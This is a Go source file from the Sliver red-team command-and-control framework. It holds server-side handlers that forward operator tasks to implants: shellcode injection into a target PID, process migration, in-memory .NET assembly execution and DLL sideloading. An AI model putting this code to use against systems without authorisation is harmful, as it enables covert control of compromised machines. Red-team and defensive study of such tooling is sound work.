package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"io/ioutil"
	"time"

	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/server/assets"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

func rpcTask(req []byte, timeout time.Duration, resp RPCResponse) {
	taskReq := &clientpb.TaskReq{}
	err := proto.Unmarshal(req, taskReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(taskReq.SliverID)
	data, _ := proto.Marshal(&sliverpb.Task{
		Encoder:  "raw",
		Data:     taskReq.Data,
		RWXPages: taskReq.RwxPages,
		Pid:      taskReq.Pid,
	})
	data, err = sliver.Request(sliverpb.MsgTask, timeout, data)
	resp(data, err)
}

func rpcMigrate(req []byte, timeout time.Duration, resp RPCResponse) {
	migrateReq := &clientpb.MigrateReq{}
	err := proto.Unmarshal(req, migrateReq)
	if err != nil {
		resp([]byte{}, err)
	}
	sliver := core.Hive.Sliver(migrateReq.SliverID)
	config := generate.SliverConfigFromProtobuf(migrateReq.Config)
	config.Format = clientpb.SliverConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.MigrateReq{
		SliverID: migrateReq.SliverID,
		Data:     shellcode,
		Pid:      migrateReq.Pid,
	})
	data, err = sliver.Request(sliverpb.MsgMigrateReq, timeout, data)
	resp(data, err)
}

func rpcExecuteAssembly(req []byte, timeout time.Duration, resp RPCResponse) {
	execReq := &sliverpb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(req, execReq)
	if err != nil {
		rpcLog.Warnf("Error unmarshaling ExecuteAssemblyReq: %v", err)
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(execReq.SliverID)
	if sliver == nil {
		rpcLog.Warnf("Could not find Sliver with ID: %d", execReq.SliverID)
		resp([]byte{}, err)
		return
	}
	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
	if err != nil {
		rpcLog.Warnf("Could not find hosting dll in %s", assets.GetDataDir())
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
		Assembly:   execReq.Assembly,
		HostingDll: hostingDllBytes,
		Arguments:  execReq.Arguments,
		Process:    execReq.Process,
		Timeout:    execReq.Timeout,
		SliverID:   execReq.SliverID,
	})
	rpcLog.Infof("Sending execute assembly request to sliver %d\n", execReq.SliverID)
	data, err = sliver.Request(sliverpb.MsgExecuteAssemblyReq, timeout, data)
	resp(data, err)

}

func rpcSideload(req []byte, timeout time.Duration, resp RPCResponse) {
	var data []byte
	sideloadReq := &clientpb.SideloadReq{}
	err := proto.Unmarshal(req, sideloadReq)
	if err != nil {
		rpcLog.Warn("Error unmarshaling SideloadReq: %v", err)
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(sideloadReq.SliverID)
	if sliver == nil {
		rpcLog.Warnf("Could not find Sliver with ID: %d", sideloadReq.SliverID)
		resp([]byte{}, err)
		return
	}
	switch sliver.ToProtobuf().GetOS() {
	case "windows":
		shellcode, err := generate.ShellcodeRDIFromBytes(sideloadReq.Data, sideloadReq.EntryPoint, sideloadReq.Args)
		if err != nil {
			resp([]byte{}, err)
			return
		}
		data, _ = proto.Marshal(&sliverpb.SideloadReq{
			SliverID: sideloadReq.SliverID,
			Data:     shellcode,
			ProcName: sideloadReq.ProcName,
		})
		data, err = sliver.Request(sliverpb.MsgSideloadReq, timeout, data)
	case "linux":
		data, _ = proto.Marshal(&sliverpb.SideloadReq{
			SliverID: sideloadReq.GetSliverID(),
			Data:     sideloadReq.GetData(),
			Args:     sideloadReq.GetArgs(),
			ProcName: sideloadReq.GetProcName(),
		})
		data, err = sliver.Request(sliverpb.MsgSideloadReq, timeout, data)
	default:
		err = fmt.Errorf("%s does not support sideloading", sliver.ToProtobuf().GetOS())
	}
	resp(data, err)

}

func rpcSpawnDll(req []byte, timeout time.Duration, resp RPCResponse) {
	spawnReq := &sliverpb.SpawnDllReq{}
	err := proto.Unmarshal(req, spawnReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(spawnReq.SliverID)
	data, err := sliver.Request(sliverpb.MsgSpawnDllReq, timeout, req)
	resp(data, err)
}
